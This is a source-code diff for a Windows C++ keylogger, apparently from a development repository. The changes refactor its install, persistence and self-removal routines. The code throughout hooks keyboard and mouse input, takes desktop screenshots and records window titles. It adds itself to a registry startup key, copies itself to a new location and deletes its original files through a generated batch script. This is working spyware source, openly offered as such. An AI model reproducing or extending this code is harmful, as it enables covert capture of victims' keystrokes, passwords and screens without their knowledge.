@@ -25,12 +25,11 @@ void KeyLogger::persist(std::string path) {
     keyValue += "\"";
 
     RegSetValueEx(key, REGKEY_NAME, 0, REG_SZ, (BYTE*)keyValue.c_str(), keyValue.length());
-    
-    lastUpload = time(NULL);
 }
 
 void KeyLogger::purge() {
     
+    //don't launch again
     HKEY key;
     RegCreateKey(
         HKEY_CURRENT_USER,
@@ -38,11 +37,17 @@ void KeyLogger::purge() {
         &key
         );
     RegDeleteValue(key, REGKEY_NAME);
+ 
+    //delete program files and exit
+    removeSelf();
+}
 
-    logFile.close();
-    UnhookWindowsHookEx(khook);
-    UnhookWindowsHookEx(mhook);
+void KeyLogger::removeSelf() {
+    
+    //make sure everything is freed
+    freeResources();
 
+    //create a batch fil that will delete program files after execution stops
     ofstream batchFile;
     batchFile.open(BATCH_NAME);
     batchFile << "@echo off" << endl;
@@ -54,10 +59,19 @@ void KeyLogger::purge() {
     batchFile.close();
     system("start cleaner.bat");
 
+    //exit ASAP
     exit(0);
 }
 
+void KeyLogger::freeResources() {
+ 
+    logFile.close();
+    UnhookWindowsHookEx(khook);
+    UnhookWindowsHookEx(mhook);
+}
+
 std::string KeyLogger::removeFilespec(std::string path) {
+
     while (path[path.length() - 1] != '\\') {
         path.erase(path.length() - 1);
     }
@@ -66,9 +80,6 @@ std::string KeyLogger::removeFilespec(std::string path) {
 }
 
 KeyLogger::KeyLogger() {
-
-    //FreeConsole();
-    //ShowWindow(GetConsoleWindow(), SW_HIDE);
 
     lshiftDown = false;
     rshiftDown = false;
@@ -87,9 +98,8 @@ KeyLogger::KeyLogger() {
 }
 
 KeyLogger::~KeyLogger() {
-    logFile.close();
-    UnhookWindowsHookEx(khook);
-    UnhookWindowsHookEx(mhook);
+
+    freeResources();
 }
 
 KeyLogger* KeyLogger::getInstance() {
@@ -221,6 +231,7 @@ LRESULT KeyLogger::hookFunction(int nCode, WPARAM wParam, LPARAM lParam) {
 }
 
 std::string KeyLogger::screenshot() {
+
     std::stringstream fileName;
     fileName << programDir << DATADIR << "\\" <<  time(NULL) << ".bmp";
     takeScreenshot(GetDesktopWindow(), fileName.str());
@@ -231,6 +242,7 @@ std::string KeyLogger::screenshot() {
 }
 
 void KeyLogger::loop() {
+    
     MSG message;
     while (GetMessage(&message, NULL, 0, 0)) {
         TranslateMessage(&message);
@@ -245,7 +257,6 @@ void KeyLogger::listen() {
         exit(1);
     }
 
-    //setup keyboard and mouse hooks
     khook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)hookFunction, instance, 0);
     mhook = SetWindowsHookEx(WH_MOUSE_LL, (HOOKPROC)hookFunction, instance, 0);
 
@@ -263,10 +274,19 @@ void KeyLogger::log(std::string text) {
     keyboardBuffer += text;
 }
 
-void KeyLogger::copySelf(std::string target) {
-
+void KeyLogger::install(std::string target) {
+     
+    //already installed, skip
+    if (target == programPath) {
+        return;
+    }
+    
+    //install keylogger and exit
     CopyFile(programPath.c_str(), target.c_str(), true);
+
     persist(target);
+
+    removeSelf();
 }
 
 void KeyLogger::writeBuffer()
@@ -300,3 +320,11 @@ std::string KeyLogger::getActiveWindowTitle() {
     return std::string(title);
 }
 
+std::string KeyLogger::getUserHomeDirectory() {
+
+    char buffer[1024];
+    GetEnvironmentVariable("USERPROFILE", buffer, sizeof(buffer));
+    strcat_s(buffer, "\\");
+    
+    return std::string(buffer);
+}
